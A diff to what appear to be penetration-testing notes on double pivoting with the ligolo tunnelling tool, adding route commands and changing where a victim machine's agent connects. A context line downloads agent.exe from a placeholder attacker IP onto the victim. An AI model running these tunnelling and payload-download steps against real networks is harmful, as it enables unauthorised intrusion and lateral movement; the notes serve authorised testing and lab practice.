@@ -88,7 +88,12 @@ Invoke-WebRequest -Uri "http://<attacker ip>:1234/agent.exe" -OutFile agent.exe
 
 listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
 
-3. Victime machine connect to the second pivot
+3. Attacker add the second pivot network
 
-./agent.exe -connect <attacker ip>:11601 -ignore-cert
+sudo ip route add <target network address>/24 dev ligolo
+sudo ip route add <target ip>/32 dev ligolo
+
+4. Victime machine connect to the second pivot
+
+./agent.exe -connect <victim 1 ip>:11601 -ignore-cert
 
